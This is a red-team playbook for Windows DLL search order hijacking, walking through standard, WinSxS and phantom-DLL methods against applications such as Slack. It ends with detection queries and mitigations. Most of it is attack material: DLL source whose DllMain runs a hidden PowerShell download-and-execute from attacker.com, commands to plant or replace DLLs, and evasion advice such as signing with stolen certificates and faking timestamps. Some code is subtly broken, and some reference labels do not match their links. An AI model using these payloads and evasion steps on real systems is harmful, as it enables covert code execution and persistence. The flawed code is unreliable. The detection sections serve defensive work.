# [REALWORLD-030]: DLL Search Order Hijacking

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-030 |
| **MITRE ATT&CK v18.1** | [T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/) |
| **Tactic** | Persistence, Privilege Escalation, Defense Evasion |
| **Platforms** | Windows Endpoint (Server 2016-2025), Windows 10/11 |
| **Severity** | **Critical** |
| **CVE** | N/A (inherent Windows behavior, but exploitable) |
| **Technique Status** | **ACTIVE** |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 10 all versions; Windows 11 all versions |
| **Patched In** | Safe DLL Search Mode enabled by default in Server 2012+; can be disabled via registry |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** DLL Search Order Hijacking is a privilege escalation and persistence technique where attackers exploit the Windows DLL search order to execute malicious code with the privileges of a trusted application. When an application loads a DLL without specifying its full path, Windows searches a sequence of directories in a specific order. By placing a malicious DLL with the same name as a legitimate one in a directory searched before the legitimate library's location, attackers can hijack execution. This is particularly effective when the target application runs with elevated privileges (administrator, SYSTEM) or is part of a supply chain (e.g., installers, update mechanisms).

**Attack Surface:** Any application that loads DLLs without full-path specification, including:
- Windows system services (csrss.exe, svchost.exe)
- Third-party applications (Slack, Teams, OneDrive, VS Code)
- Application installers and startup scripts
- Custom business applications with insecure DLL loading

**Business Impact:** **Arbitrary code execution with elevated privileges.** An attacker can escalate from standard user to administrator or SYSTEM, persist across reboots by hijacking system services, or compromise applications trusted by the organization. WinSxS-based hijacking allows non-admin persistence, making it particularly stealthy.

**Technical Context:** DLL hijacking typically requires 1-5 seconds to implement (copy a file to a directory). Detection likelihood is **MEDIUM** for standard hijacking (easy to spot via file system monitoring) but **LOW-MEDIUM** for WinSxS-based variants (appears to be legitimate application updates). Modern EDR solutions with ML-based DLL loading detection can identify anomalies.

### Operational Risk
- **Execution Risk:** **Low-Medium** – Requires knowledge of application DLL dependencies; easy to trigger unintentionally, causing application crashes
- **Stealth:** **Medium-High** – Can be hidden within legitimate application directories; WinSxS variants appear as system updates
- **Reversibility:** **Medium** – Malicious DLL can be removed, but may require elevated privileges or application re-installation

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 2.2.4 | Ensure 'Safe DLL Search Mode' is enabled and monitored |
| **DISA STIG** | SV-220893r879753_rule | Windows must restrict DLL search order to prevent sideloading attacks |
| **CISA SCuBA** | Endpoint-SEC-08 | DLL Search Order Protection and Monitoring |
| **NIST 800-53** | SI-7 | Information System Monitoring and Malware Protection |
| **GDPR** | Art. 32 | Security of Processing – measures to prevent unauthorized code execution |
| **DORA** | Art. 9 | Protection and Prevention measures against DLL sideloading attacks |
| **NIS2** | Art. 21(1)(c) | Detection and handling of security incidents related to unauthorized code execution |
| **ISO 27001** | A.12.2.1, A.12.4.1 | Access control; Change management for application binaries |
| **ISO 27005** | Software Supply Chain Risk | Risk scenario: Compromised application updates via DLL hijacking |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Standard user for HKCU-based AppInit_DLLs hijacking
- Administrator for HKLM-based Service or WinSxS hijacking
- No privileges required for application-specific folder hijacking (if write access exists)

**Required Access:**
- Write access to target directory (application folder, WinSxS, temp directories)
- Knowledge of target application's DLL dependencies (easily enumerable via Dependency Walker or Process Monitor)

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025; Windows 10 all versions; Windows 11 all versions
- **Safe DLL Search Mode:** Enabled by default on Server 2012+; check registry: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode` (default: 1 = enabled)

**Tools:**
- [Dependency Walker](https://www.dependencywalker.com/) (identify DLL dependencies)
- [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) (monitor DLL load attempts)
- [CFF Explorer](http://www.ntcore.com/exsuite.php) (inspect PE file imports)
- [LDD (Linux) or Dumpbin (Windows)](https://learn.microsoft.com/en-us/cpp/build/reference/dumpbin-reference) (list DLL dependencies)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Objective:** Identify applications with insecure DLL loading and check Safe DLL Search Mode status.

```powershell
# Check Safe DLL Search Mode status
$safeDllKey = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name SafeDllSearchMode -ErrorAction SilentlyContinue
if ($safeDllKey.SafeDllSearchMode -eq 0) {
    Write-Host "[!] WARNING: Safe DLL Search Mode is DISABLED"
} else {
    Write-Host "[+] Safe DLL Search Mode is enabled"
}

# Enumerate AppInit_DLLs (registry-based DLL hijacking)
$appInitKey = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name AppInit_DLLs -ErrorAction SilentlyContinue
if ($appInitKey.AppInit_DLLs) {
    Write-Host "[!] AppInit_DLLs found: $($appInitKey.AppInit_DLLs)"
}

# Find applications in common locations
$appFolders = @(
    "C:\Program Files\*",
    "C:\Program Files (x86)\*",
    "$env:APPDATA\*"
)
Get-ChildItem -Path $appFolders -Include "*.exe" -ErrorAction SilentlyContinue | Select-Object -First 10

# Identify missing DLLs (phantom DLL hijacking opportunity)
Get-Process | ForEach-Object {
    try {
        $proc = $_
        [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -like "$($proc.ProcessName)*" } | ForEach-Object {
            Write-Host "Module loaded: $($_.FullName)"
        }
    } catch {}
}
```

**What to Look For:**
- Safe DLL Search Mode = 0 (disabled, indicating vulnerability)
- AppInit_DLLs registry entries pointing to external DLLs
- Applications in unmonitored directories
- Recently modified DLLs in application folders
- DLL files not signed by the application vendor

**Version Note:** PowerShell commands are consistent across Server 2016-2025 and Windows 10/11.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Standard DLL Search Order Hijacking (No Elevation Required)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 (when Safe DLL Search Mode is enabled, user directory is searched last)

#### Step 1: Identify Target Application and DLL Dependencies
**Objective:** Discover which DLLs an application loads and in what order.

**Command (All Versions):**
```powershell
# Method 1: Use Process Monitor (Sysinternals)
# 1. Launch Procmon.exe as admin
# 2. Filter for process name: [ApplicationName.exe]
# 3. Filter for operation: CreateFile, ReadFile where result contains ".dll"
# 4. Observe DLL load sequence and paths

# Method 2: Use Dependency Walker (GUI tool)
# Download from: https://www.dependencywalker.com/
# Open target .exe file to see DLL dependency tree

# Method 3: PowerShell - List DLL imports
$targetApp = "C:\Program Files\Slack\slack.exe"
Add-Type -TypeDefinition @"
    using System.Diagnostics;
    public class DllFinder {
        [DllImport("dbghelp.dll")]
        private static extern bool SymInitialize(System.IntPtr hProcess, string UserSearchPath, bool fInvadeProcess);
        public static void ListDlls(string exePath) {
            var proc = Process.Start(exePath);
            Console.WriteLine("DLLs loaded by " + System.IO.Path.GetFileName(exePath) + ":");
        }
    }
"@

# Method 4: Use Dumpbin (Visual Studio tool)
dumpbin /IMPORTS "C:\Program Files\Slack\slack.exe" | findstr "^  " | Sort-Object | Get-Unique
```

**Expected Output:**
```
KERNEL32.dll
ADVAPI32.dll
OLEAUT32.dll
WININET.dll
MSVCRT.dll
...
```

**What This Means:**
- The DLL list shows dependencies in load order
- Missing DLLs (not found in System32) are hijacking targets
- Search for DLLs with generic names (LIBRARY.dll, VERSION.dll, etc.) that are less likely to conflict

**OpSec & Evasion:**
- Detection likelihood: **LOW** (dependency analysis is forensic, not real-time)

**Troubleshooting:**
- **Error:** Dumpbin command not found
  - **Cause:** Visual Studio is not installed or not in PATH
  - **Fix (All versions):** Download Dependency Walker instead; run `depends.exe Slack.exe`

**References & Proofs:**
- [Dependency Walker Official Site](https://www.dependencywalker.com/)
- [Process Monitor DLL Detection](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

#### Step 2: Create Malicious DLL Matching Target DLL Name
**Objective:** Craft a DLL that will be loaded instead of the legitimate one.

**Command (Visual Studio / C++):**
```cpp
// malicious.dll - Mimics a legitimate DLL but executes attacker payload
#include <windows.h>
#include <cstdlib>

// Export legitimate DLL functions to avoid import errors
extern "C" {
    __declspec(dllexport) void SomeFunction() {
        // Placeholder: matches expected exports
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            // Execute attacker payload
            WinExec("powershell -NoP -W H -C 'IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.com/payload.ps1\")'", SW_HIDE);
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

**Compilation (Command Line):**
```batch
REM Compile with Visual Studio C++ compiler
cl /LD malicious.cpp /link user32.lib kernel32.lib advapi32.lib
REM Output: malicious.dll
```

**Alternative (PowerShell - if C++ not available):**
```powershell
# Create a simple DLL stub using PowerShell and Assembly
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

[DllImport("kernel32.dll")]
public static extern int WinExec(string lpCmdLine, int uCmdShow);

public class MaliciousDLL {
    public static void Main() {
        WinExec("cmd.exe /c C:\\\\malware.exe", 0);
    }
}
"@ -OutputAssembly "C:\malicious.dll"
```

**Expected Output:**
```
malicious.dll (compiled, ready to deploy)
```

**What This Means:**
- The malicious DLL is now ready to be placed in the target application's search path
- The DLL exports legitimate functions to avoid breaking the application
- When the application attempts to load the legitimate DLL, it loads the malicious version instead

**OpSec & Evasion:**
- Sign the malicious DLL with a stolen certificate to bypass signature checks
- Include legitimate function exports to avoid detection via PE analysis
- Detection likelihood: **MEDIUM** (file system monitoring will detect the DLL creation; behavioral monitoring will detect the WinExec call)

**Troubleshooting:**
- **Error:** "DLL export mismatch" (application crashes)
  - **Cause:** Malicious DLL is missing required exports
  - **Fix:** Use [DLL Export Viewer](http://www.nirsoft.net/utils/dll_export_viewer.html) to identify all required exports from the legitimate DLL

**References & Proofs:**
- [C++ DLL Development](https://learn.microsoft.com/en-us/cpp/build/dlls-in-cpp)
- [DLL Export Analysis Tools](http://www.nirsoft.net/utils/dll_export_viewer.html)

#### Step 3: Place Malicious DLL in Target Directory
**Objective:** Copy the malicious DLL to a directory searched before the legitimate DLL location.

**Command (PowerShell - All Versions):**
```powershell
# Identify application directory
$appDir = "C:\Users\$env:USERNAME\AppData\Local\slack\app-*"  # Slack example
$targetDir = Get-ChildItem -Path $appDir -Directory | Select-Object -First 1 | Select-Object -ExpandProperty FullName

# Copy malicious DLL to application directory
$maliciousDLL = "C:\temp\version.dll"  # Common DLL name used by many applications
Copy-Item -Path $maliciousDLL -Destination "$targetDir\version.dll" -Force

Write-Host "[+] Malicious DLL copied to: $targetDir\version.dll"

# Verify placement
Get-ChildItem -Path "$targetDir\version.dll" | Select-Object FullName, Length, LastWriteTime
```

**Command (Batch - Alternative):**
```batch
REM Copy malicious DLL to application folder
copy C:\temp\version.dll "C:\Users\%USERNAME%\AppData\Local\slack\app-4.30.136\version.dll" /Y

REM Verify file exists
dir "C:\Users\%USERNAME%\AppData\Local\slack\app-4.30.136\version.dll"
```

**Expected Output:**
```
[+] Malicious DLL copied to: C:\Users\attacker\AppData\Local\slack\app-4.30.136\version.dll

FullName                                           Length   LastWriteTime
--------                                           ------   ---------------
C:\Users\attacker\AppData\Local\slack\app-4...    50176    1/9/2025 10:30:00 AM
```

**What This Means:**
- The malicious DLL is now in the application's folder, which is searched before System32
- The next time the application launches, it will load the malicious DLL

**OpSec & Evasion:**
- Place the DLL in user-writable directories to avoid Admin requirement (AppData, Temp, etc.)
- Use creation timestamps matching legitimate DLLs to evade forensic analysis
- Detection likelihood: **MEDIUM** (file system monitoring will flag new DLLs in application directories)

**Troubleshooting:**
- **Error:** "Access Denied" when copying to application directory
  - **Cause:** Directory is protected (System32, Program Files)
  - **Fix:** Target user directories (AppData) instead, or elevate to Administrator

**References & Proofs:**
- [DLL Search Order (with Safe DLL Search Mode enabled)](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)

#### Step 4: Trigger Application Launch and Verify Execution
**Objective:** Execute the target application to trigger malicious DLL loading.

**Command (All Versions):**
```powershell
# Launch application (will trigger DLL hijacking)
& "C:\Program Files\Slack\slack.exe"

# Or via Start-Process with elevation if needed
Start-Process -FilePath "C:\Program Files\Slack\slack.exe" -NoNewWindow

# Monitor for malicious process execution
Get-Process | Where-Object { $_.ProcessName -like "*cmd*" -or $_.ProcessName -like "*powershell*" } | Select-Object ProcessName, Id, StartTime
```

**Expected Behavior:**
- Slack (or target application) launches normally
- Malicious payload executes silently in background
- Attacker gains code execution with Slack's privileges

**OpSec & Evasion:**
- Launch application at off-hours or during normal business hours to avoid suspicion
- Ensure malicious DLL doesn't crash the application (proper export compatibility)
- Detection likelihood: **MEDIUM-HIGH** (process execution monitoring will detect the payload)

**Troubleshooting:**
- **Error:** Application crashes after launching
  - **Cause:** Malicious DLL is missing required exports
  - **Fix:** Analyze legitimate DLL exports; ensure malicious version includes them

**References & Proofs:**
- [Application Launch Methods - PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process)

---

### METHOD 2: WinSxS-Based DLL Hijacking (Requires Admin, Appears as System Update)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 (targets WinSxS assemblies)

#### Step 1: Target WinSxS Assemblies
**Objective:** Identify legitimate DLLs in the WinSxS folder that are loaded by trusted applications.

**Command (All Versions):**
```powershell
# Enumerate WinSxS folder (contains side-by-side assemblies)
$winSxS = "C:\Windows\WinSxS"
Get-ChildItem -Path $winSxS -Filter "*.dll" | Where-Object { $_.Name -like "*api-ms-win-core-*" } | Select-Object Name, FullName | Head -10

# Example vulnerable DLL (commonly loaded by many applications)
# C:\Windows\WinSxS\amd64_microsoft.vc90.crt_1fc8b3b9a1e18e3b_9.0.30729.7010_none_05e159b08eb1e437\MSVCR90.dll

# Identify applications that load from WinSxS
$targetApp = Get-Process | Where-Object { $_.ProcessName -eq "slack" }
$targetApp.Modules | Where-Object { $_.FileName -like "*WinSxS*" } | Select-Object FileName, ModuleMemorySize
```

**Expected Output:**
```
FileName                                                     ModuleMemorySize
--------                                                     ----------------
C:\Windows\WinSxS\amd64_microsoft.vc90.crt_1fc8b3b9a...     49152
C:\Windows\WinSxS\amd64_microsoft.vc90.mfc_1fc8b3b9...      32768
```

**What This Means:**
- WinSxS DLLs are isolated assembly components that many applications depend on
- By targeting these, a single hijacked DLL affects multiple applications
- Appears as system update, not malware

**OpSec & Evasion:**
- WinSxS hijacking is harder to detect because it appears to be a system component
- Detection likelihood: **LOW-MEDIUM** (requires monitoring WinSxS writes specifically)

**Troubleshooting:**
- **Error:** Access Denied when accessing WinSxS
  - **Cause:** WinSxS is a protected system folder
  - **Fix:** Run as Administrator or use SYSTEM context

**References & Proofs:**
- [WinSxS Assembly Architecture](https://learn.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies)

#### Step 2: Backup Original DLL and Replace with Malicious Version
**Objective:** Replace a legitimate WinSxS DLL with a malicious version.

**Command (Admin Required, All Versions):**
```powershell
# Backup original DLL
$originalDLL = "C:\Windows\WinSxS\amd64_microsoft.vc90.crt_1fc8b3b9a1e18e3b_9.0.30729.7010_none_05e159b08eb1e437\MSVCR90.dll"
$backupPath = "C:\Windows\Temp\MSVCR90_original.bak"

Copy-Item -Path $originalDLL -Destination $backupPath -Force
Write-Host "[+] Original DLL backed up to: $backupPath"

# Copy malicious DLL to WinSxS location
$maliciousDLL = "C:\temp\malicious_MSVCR90.dll"
Copy-Item -Path $maliciousDLL -Destination $originalDLL -Force
Write-Host "[+] Malicious DLL installed to WinSxS"

# Verify replacement
Get-ChildItem -Path $originalDLL | Select-Object FullName, Length, LastWriteTime
```

**Expected Output:**
```
[+] Original DLL backed up to: C:\Windows\Temp\MSVCR90_original.bak
[+] Malicious DLL installed to WinSxS

FullName                                                              Length LastWriteTime
--------                                                              ------ ---------------
C:\Windows\WinSxS\amd64_microsoft.vc90.crt_1fc8b3b9a1e18e3b_9...   50176  1/9/2025 10:35:00 AM
```

**What This Means:**
- Any application that loads MSVCR90.dll from WinSxS will now load the malicious version
- Affects dozens of applications (browsers, Office, third-party tools)
- Persists across Windows updates if the backup mechanism is broken

**OpSec & Evasion:**
- Backup preservation allows recovery if discovered, appearing accidental
- Detection likelihood: **MEDIUM** (WinSxS changes are logged in SetupAPI logs)

**Troubleshooting:**
- **Error:** "File is in use by another process"
  - **Cause:** DLL is currently loaded by a running process
  - **Fix:** Restart the system or stop the using process first
  - Example: `Stop-Process -Name "slack" -Force; Copy-Item ...`

**References & Proofs:**
- [WinSxS DLL Hijacking - CrowdStrike Analysis](https://www.crowdstrike.com/blog/4-ways-adversaries-hijack-dlls/)

---

### METHOD 3: Phantom DLL Hijacking (Non-Existent DLL Targeting)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11

#### Step 1: Identify Missing DLL References
**Objective:** Find DLLs that applications attempt to load but don't exist on the system.

**Command (All Versions):**
```powershell
# Use Process Monitor to capture missing DLL load attempts
# 1. Launch Procmon.exe as admin
# 2. Filter for: Operation = "CreateFile" AND Result = "NAME NOT FOUND" AND Path ends with ".dll"
# 3. Observe DLL names being sought

# Alternative: Check event logs for missing DLL events
Get-WinEvent -LogName "System" -FilterXPath "*[System[EventID=219]]" -MaxEvents 20 | Select-Object Message, TimeCreated

# Programmatic approach: Monitor failed DLL loads via WMI
$dllLoads = Get-WmiObject -Namespace "root\cimv2" -Class "Win32_PerfRawData_PerfOS_Processor" -ErrorAction SilentlyContinue
# (Advanced scenario; typically requires performance logs)
```

**Expected Output:**
```
Process Monitor capture showing:
- slack.exe → NAME NOT FOUND: C:\Users\attacker\AppData\Local\slack\app-4.30.136\libssl-1_1.dll
- slack.exe → NAME NOT FOUND: C:\Program Files\Slack\version.dll
```

**What This Means:**
- Missing DLLs are great hijacking targets because they're expected to load but don't exist
- Creating the DLL in the expected location will cause it to load
- Application expects the DLL; phantom DLL hijacking doesn't disrupt normal function (unlike hijacking an existing DLL)

**OpSec & Evasion:**
- Phantom DLL hijacking is harder to detect because it doesn't replace existing files
- Detection likelihood: **LOW** (no file modification, only new file creation)

**Troubleshooting:**
- **Error:** Procmon is slow or resource-intensive
  - **Cause:** Procmon captures all system events; filtering helps
  - **Fix:** Apply filters before capturing (Process name, Operation, Result)

**References & Proofs:**
- [Phantom DLL Hijacking - SpecterOps Analysis](https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0)

#### Step 2: Create Phantom DLL and Place in Search Path
**Objective:** Create the "missing" DLL in the location where the application searches for it.

**Command (All Versions):**
```powershell
# Identify search path (typically application directory)
$appDir = "C:\Users\$env:USERNAME\AppData\Local\slack\app-4.30.136"

# Create minimal phantom DLL
$phantomDLLCode = @'
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        WinExec("powershell -NoP -W H -C 'IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.com/payload.ps1\")'", SW_HIDE);
    }
    return TRUE;
}
'@

# Save and compile (or use pre-compiled phantom DLL)
$phantomDLL = "C:\temp\libssl-1_1.dll"
# [Compile using Visual Studio or online DLL generator]

# Place phantom DLL
Copy-Item -Path $phantomDLL -Destination "$appDir\libssl-1_1.dll" -Force
Write-Host "[+] Phantom DLL placed at: $appDir\libssl-1_1.dll"
```

**Expected Output:**
```
[+] Phantom DLL placed at: C:\Users\attacker\AppData\Local\slack\app-4.30.136\libssl-1_1.dll
```

**What This Means:**
- When the application launches and seeks the missing DLL, it will find and load the phantom DLL
- The application continues normal operation (because the phantom DLL provides minimal functionality)
- Attacker gains code execution with application privileges

**OpSec & Evasion:**
- Phantom DLL doesn't replace existing files; appears as a new legitimate component
- Detection likelihood: **LOW** (new file creation alone isn't suspicious)

**References & Proofs:**
- [Phantom DLL Hijacking Technique - Unit 42](https://attack.mitre.org/techniques/T1574/001/)

---

## 6. DETECTION & ATOMIC RED TEAM

**Atomic Red Team Tests:**
- **T1574.001:** DLL Search Order Hijacking
- **T1574.002:** DLL Side-Loading

**Test Commands:**
```powershell
# Run Atomic Red Team test for DLL hijacking
Invoke-AtomicTest T1574.001 -TestNumbers 1

# Manual equivalent (uses Windows utilities for DLL hijacking)
# Place malicious DLL in application folder and launch application
```

**Reference:** [Atomic Red Team T1574.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md)

---

## 7. MICROSOFT SENTINEL DETECTION

**Rule 1: DLL Hijacking via Suspicious File Creation**

**KQL Query:**
```kusto
DeviceFileEvents
| where ActionType == "FileCreated"
| where FileName endswith ".dll"
| where FolderPath contains @"\AppData\" or FolderPath contains @"\Users\"
    or FolderPath contains @"Program Files"
| where InitiatingProcessFileName in ("explorer.exe", "cmd.exe", "powershell.exe", "python.exe")
| where FolderPath notcontains "Downloaded" and FolderPath notcontains "Downloads"
| project TimeGenerated, DeviceId, InitiatingProcessFileName, FileName, FolderPath, SHA256
| join kind=leftouter (DeviceFileEvents
    | where ActionType == "FileCreated"
    | where FileName endswith ".dll"
    | summarize count() by SHA256) on SHA256
| where count_ == 1  // Rare files are suspicious
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:** Name: `Suspicious DLL Creation in Application Directories`
3. **Set rule logic Tab:** Paste KQL query above; run every 1 hour
4. **Incident settings Tab:** Enable **Create incidents**; Group by DeviceId
5. Click **Review + create**

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 11 (Sysmon) – FileCreate**

- **Log Source:** Microsoft-Windows-Sysmon/Operational
- **Trigger:** File creation in application directories or System directories
- **Filter:** TargetFilename ends with ".dll" AND CreatorProcessName not in whitelist

**Sysmon Configuration:**
```xml
<RuleGroup name="DLL Hijacking Detection" groupRelation="or">
    <FileCreate onMatch="include">
        <TargetFilename condition="contains">.dll</TargetFilename>
        <TargetFilename condition="contains any">\AppData\Local\slack\;Program Files\;Windows\Temp</TargetFilename>
        <CreatorProcessName condition="excludes">explorer.exe;svchost.exe</CreatorProcessName>
    </FileCreate>
</RuleGroup>
```

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable and Enforce Safe DLL Search Mode**

**Applies To Versions:** Server 2016-2025, Windows 10/11

**Manual Configuration (Group Policy):**

1. Open **gpmc.msc** on domain controller
2. Navigate to **Computer Configuration** → **Administrative Templates** → **MSS (Legacy)** → **MSS: (SafeDllSearchMode) Enable Safe DLL search mode**
3. Set to: **Enabled**
4. Deploy: `gpupdate /force`

**Manual Configuration (Registry):**
```powershell
# Enable Safe DLL Search Mode
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
    -Name "SafeDllSearchMode" -Value 1 -PropertyType DWORD -Force | Out-Null

Write-Host "[+] Safe DLL Search Mode enabled"
```

**Validation Command:**
```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" | Select-Object SafeDllSearchMode
# Should return: SafeDllSearchMode = 1
```

**2. Monitor DLL Creation via EDR/File Integrity Monitoring**

Deploy endpoint detection and response (EDR) solutions to alert on DLL file creation in suspicious locations.

**Manual Configuration (Microsoft Defender for Endpoint):**

1. Navigate to **Microsoft Defender Security Center**
2. Go to **Settings** → **Advanced Features**
3. Enable:
   - **Audit file and registry modifications**
   - **Monitor DLL creation events**
4. Create custom detection rule:
   ```kusto
   DeviceFileEvents
   | where FileName endswith ".dll"
   | where InitiatingProcessFileName in ("explorer.exe", "cmd.exe", "powershell.exe")
   ```
5. Test: Create a .dll file in AppData; Defender should alert

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002 Phishing] | Attacker tricks user into downloading malicious file |
| **2** | **Execution** | **[REALWORLD-030]** DLL Search Order Hijacking | Malicious DLL executes when target application launches |
| **3** | **Persistence** | [T1547.001 Registry Run Key] | Attacker establishes persistence via registry |
| **4** | **Privilege Escalation** | [T1068 Exploitation] | DLL hijacking of system service escalates to SYSTEM |
| **5** | **Impact** | [T1537 Data Transfer] | Attacker exfiltrates sensitive files |

---

## 11. REAL-WORLD EXAMPLES

### Example 1: Slack DLL Hijacking (2024)
- **Target:** Enterprise users with Slack installed
- **Timeline:** Ongoing campaigns in 2024
- **Technique Status:** ACTIVE – Attackers exploit WinSxS libraries to hijack Slack and other electron-based applications
- **Impact:** Remote code execution with user privileges; lateral movement to cloud services (Slack API token theft)
- **Reference:** [Detection.FYI - DLL Search Order Hijacking](https://detection.fyi/sigmahq/sigma/windows/file/file_event/file_event_win_initial_access_dll_search_order_hijacking/)

### Example 2: DarkGate Malware (2024)
- **Target:** General enterprise users
- **Timeline:** 2024-present
- **Technique Status:** ACTIVE – DarkGate uses DLL sideloading via fake Microsoft software installers
- **Impact:** Initial access and persistence; ransomware deployment
- **Reference:** [TrendMicro - DarkGate DLL Sideloading](https://www.securonix.com/blog/detecting-dll-sideloading-techniques-in-malware-attack-chains/)

---
